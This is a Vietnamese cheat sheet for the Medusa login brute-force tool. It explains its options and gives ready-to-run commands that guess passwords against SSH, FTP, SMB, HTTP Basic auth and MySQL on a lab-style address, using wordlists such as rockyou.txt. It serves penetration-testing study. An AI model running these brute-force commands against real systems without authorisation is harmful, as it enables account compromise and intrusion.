# Medusa

## Tổng quát

Medusa là một công cụ brute-force đăng nhập nhanh, hỗ trợ nhiều giao thức mạng như SSH, FTP, HTTP, SMB, RDP, MySQL, MSSQL, VNC,...

## Công dụng

- Brute-force SSH
- Brute-force FTP
- Brute-force HTTP/HTTPS Login
- Brute-force SMB
- Brute-force RDP
- Brute-force MySQL, MSSQL,...
- Hỗ trợ username/password đơn hoặc từ wordlist

---

# Cú pháp cơ bản

```bash
medusa [-h host | -H hosts.txt] [-u username | -U users.txt] [-p password | -P passwords.txt] [-C combo.txt] -M module [OPTIONS]
```

### Giải thích

| Tham số | Ý nghĩa                                   |
| ------- | ----------------------------------------- |
| `-h`    | Host mục tiêu                             |
| `-H`    | Danh sách host                            |
| `-u`    | Một username                              |
| `-U`    | Danh sách username                        |
| `-p`    | Một password                              |
| `-P`    | Danh sách password                        |
| `-C`    | File chứa `username:password`             |
| `-M`    | Module (ssh, ftp, smbnt, http, mysql,...) |
| `-t`    | Số luồng (threads)                        |

---

# Các bài tấn công cơ bản

## SSH

```bash
medusa -h 10.10.10.10 -u root -P rockyou.txt -M ssh
```

Brute-force nhiều username:

```bash
medusa -h 10.10.10.10 \
       -U users.txt \
       -P rockyou.txt \
       -M ssh
```

---

## FTP

```bash
medusa -h 10.10.10.10 \
       -u ftp \
       -P rockyou.txt \
       -M ftp
```

---

## SMB

```bash
medusa -h 10.10.10.10 \
       -u administrator \
       -P rockyou.txt \
       -M smbnt
```

---

## HTTP Basic Authentication

```bash
medusa -h 10.10.10.10 \
       -u admin \
       -P rockyou.txt \
       -M http
```

---

## MySQL

```bash
medusa -h 10.10.10.10 \
       -u root \
       -P rockyou.txt \
       -M mysql
```

---

## Sử dụng file chứa username và password

```bash
medusa -h 10.10.10.10 \
       -U users.txt \
       -P passwords.txt \
       -M ssh
```

---

## Sử dụng file combo (username:password)

```bash
medusa -h 10.10.10.10 \
       -C combo.txt \
       -M ssh
```